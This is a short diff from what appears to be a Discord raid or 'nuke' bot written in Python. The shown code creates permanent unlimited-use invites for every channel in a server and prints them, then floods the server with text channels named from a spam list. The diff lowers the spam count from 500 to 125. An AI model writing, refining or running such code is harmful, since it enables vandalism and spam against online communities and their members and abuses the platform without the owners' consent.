@@ -106,7 +106,7 @@ async def help(ctx):
     for channel in guild.text_channels:
         link = await channel.create_invite(max_age = 0, max_uses = 0)
         print(f"  [{Fore.GREEN}+{Fore.RESET}]{Fore.YELLOW} New Invite: {Fore.RESET}{link}")
-    amount = 500
+    amount = 125
     for i in range(amount):
        await guild.create_text_channel(random.choice(SPAM_CHANNEL))
        print(f'  [{Fore.GREEN}+{Fore.RESET}] Created new text channel')
